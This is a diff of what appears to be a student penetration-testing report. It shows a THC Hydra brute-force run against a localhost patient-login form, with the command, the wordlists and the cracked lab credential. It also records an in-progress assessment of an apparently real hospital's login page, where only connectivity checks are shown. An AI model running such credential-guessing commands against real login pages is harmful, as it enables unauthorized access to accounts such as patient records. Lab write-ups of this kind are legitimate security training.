@@ -1,4 +1,6 @@
 # networkwalks-B082-week3-Phase1-2
+# PENETRATION TESTING REPORT
+
 ## PASSWORD SECURITY & PASSWORD CRACKING PHASE
 
 ### W3-PM-FINAL | CYBERSECURITY | NETWORKWALKS
@@ -244,9 +246,78 @@ This controlled exercise demonstrated how weak credentials can be susceptible to
 
 **Status: 🟡 In Progress**
 
-W3-OPTIONAL2 extends the Week 3 practical activities into web-authentication security assessment.
+W3-OPTIONAL2 extends the Week 3 practical activities into web-authentication security assessment using Kali Linux.
 
-The external web application observed during this activity is:
+This optional activity currently consists of two clearly separated stages:
+
+1. A controlled localhost authentication laboratory used to validate the authentication-testing methodology.
+2. The Mediroza Hospital web-authentication assessment, which remains in progress.
+
+#### Stage 1 – Controlled Local Authentication Laboratory
+
+Before continuing with the external assessment, I created and tested a controlled authentication application on my own Kali Linux environment.
+
+The local application was available at:
+
+```text
+http://127.0.0.1/patient/login.php
+```
+
+Because `127.0.0.1` is the loopback address, the credential-testing activity remained inside my locally controlled laboratory environment.
+
+The local patient-login page contained username and password fields. An unsuccessful authentication attempt returned:
+
+```text
+Invalid credentials
+```
+
+This response was used as the failure condition during the controlled automated authentication test.
+
+Two small laboratory wordlists were prepared:
+
+```text
+6 usernames
+7 passwords
+42 possible credential combinations
+```
+
+THC Hydra was then used to test the candidate credentials against the local HTTP POST authentication form.
+
+```bash
+hydra -L ~/users.txt -P ~/passwords.txt 127.0.0.1 \
+http-post-form "/patient/login.php:username=^USER^&password=^PASS^:F=Invalid credentials" \
+-V -f
+```
+
+Hydra processed the 42 possible combinations and identified the deliberately configured laboratory credential:
+
+```text
+Username: hydra-lab
+Password: kali
+```
+
+The terminal reported:
+
+```text
+[80][http-post-form] host: 127.0.0.1   login: hydra-lab   password: kali
+1 of 1 target successfully completed, 1 valid password found
+```
+
+The result was manually verified through the local patient-login page. The application returned:
+
+```text
+Login successful
+```
+
+This confirmed that the automated result was genuine rather than a false positive.
+
+The `hydra-lab / kali` credential belongs exclusively to the localhost laboratory and is not presented as a credential or finding associated with the external Mediroza Hospital application.
+
+#### Stage 2 – Mediroza Hospital Web Authentication Assessment
+
+After validating the methodology locally, I proceeded with the Mediroza Hospital web-authentication assessment.
+
+The web application observed during this activity is:
 
 ```text
 https://www.medirozahospital.com/
@@ -258,23 +329,21 @@ A patient authentication interface was observed at:
 /patient/login.php
 ```
 
-The interface presented username and password fields. An unsuccessful authentication attempt produced the following response:
+An unsuccessful authentication attempt produced:
 
 ```text
 Invalid credentials
 ```
 
-The Mediroza activity is separate from the controlled localhost laboratory documented in W3-OPTIONAL1. The `hydra-lab / kali` credential identified in the localhost exercise belongs exclusively to the deliberately configured local laboratory and is not presented as a credential or finding associated with the external application.
+During the ongoing assessment, the external website subsequently became inaccessible from Kali Linux. Connectivity troubleshooting was therefore performed before continuing.
 
-During the ongoing W3-OPTIONAL2 activity, the external website subsequently became inaccessible from the Kali Linux environment. I therefore performed basic connectivity troubleshooting before continuing the assessment.
-
-First, Internet connectivity was verified:
+#### Internet Connectivity Verification
 
 ```bash
 ping -c 4 8.8.8.8
 ```
 
-The result showed:
+Result:
 
 ```text
 4 packets transmitted
@@ -282,54 +351,68 @@ The result showed:
 0% packet loss
 ```
 
-This confirmed that Kali Linux retained basic Internet connectivity.
+This confirmed that Kali Linux retained Internet connectivity.
 
-DNS resolution was then verified:
+#### DNS Resolution Verification
 
 ```bash
 getent hosts www.medirozahospital.com
 ```
 
-The hostname successfully resolved to:
+Result:
 
 ```text
 199.188.201.16  medirozahospital.com www.medirozahospital.com
 ```
 
-TCP connectivity to HTTP port 80 was tested:
+This confirmed that DNS resolution remained functional.
+
+#### HTTP Connectivity Verification
 
 ```bash
 nc -vz -w 5 www.medirozahospital.com 80
 ```
 
-The connection was refused.
+Result:
 
-TCP connectivity to HTTPS port 443 was also tested:
+```text
+Connection refused
+```
+
+#### HTTPS Connectivity Verification
 
 ```bash
 nc -vz -w 5 www.medirozahospital.com 443
 ```
 
-The connection was also refused.
+Result:
 
-Finally, an HTTPS request was attempted using cURL:
+```text
+Connection refused
+```
+
+#### HTTPS Request Verification
 
 ```bash
 curl -I --connect-timeout 10 https://www.medirozahospital.com/
 ```
 
-The result was:
+Result:
 
 ```text
 curl: (7) Failed to connect to www.medirozahospital.com port 443:
 Could not connect to server
 ```
 
-Kali Linux was restarted and the connectivity tests were repeated. Internet connectivity and DNS resolution remained functional, while the destination HTTPS service remained unavailable.
+#### Kali Linux Restart
 
-The host computer was subsequently restarted as an additional troubleshooting measure. After restarting the computer, Kali Linux again had working Internet connectivity and DNS resolution, but the external HTTP/HTTPS service remained unavailable during testing.
+Kali Linux was restarted. Internet connectivity and DNS resolution continued to work, while HTTPS connectivity to the destination remained unavailable.
 
-The current observations are summarized below:
+#### Host Computer Restart
+
+The host computer was also restarted. After restart, Kali Linux again had working Internet connectivity and DNS resolution, but the external HTTP/HTTPS service remained unavailable during testing.
+
+#### Current Troubleshooting Summary
 
 | Test | Result |
 |---|---|
@@ -337,17 +420,23 @@ The current observations are summarized below:
 | Packet loss | 0% |
 | DNS resolution | ✅ Working |
 | Resolved address | `199.188.201.16` |
-| TCP port 80 | Connection refused |
-| TCP port 443 | Connection refused |
-| HTTPS cURL request | Connection could not be established |
+| TCP port 80 | ❌ Connection refused |
+| TCP port 443 | ❌ Connection refused |
+| HTTPS cURL request | ❌ Connection could not be established |
 | Kali Linux restart | No change |
 | Host-computer restart | No change |
 
-These observations establish that the Kali Linux environment retained Internet connectivity and could resolve the target hostname while the tested HTTP and HTTPS connections were not being accepted at that time.
+The evidence establishes that Kali Linux retained Internet connectivity and successfully resolved the target hostname while HTTP and HTTPS connections were not being accepted at the time of testing.
 
-The available evidence does not establish the underlying reason for the external service's unavailability. Therefore, the connectivity condition is documented as a troubleshooting observation rather than a confirmed vulnerability.
+The available evidence does not establish the underlying reason for the external service's unavailability. The condition is therefore documented as a troubleshooting observation rather than a confirmed vulnerability.
 
-The assessment will continue when the authorized target service is available again.
+#### W3-OPTIONAL2 Current Result
+
+The controlled localhost authentication laboratory was completed successfully and validated the authentication-testing methodology within the locally controlled environment.
+
+The Mediroza Hospital assessment has not yet reached a final result because the external web service became unavailable during the ongoing activity.
+
+Additional evidence and findings will be documented only after they are actually observed and validated.
 
 **W3-OPTIONAL2 Status:** 🟡 In Progress
 
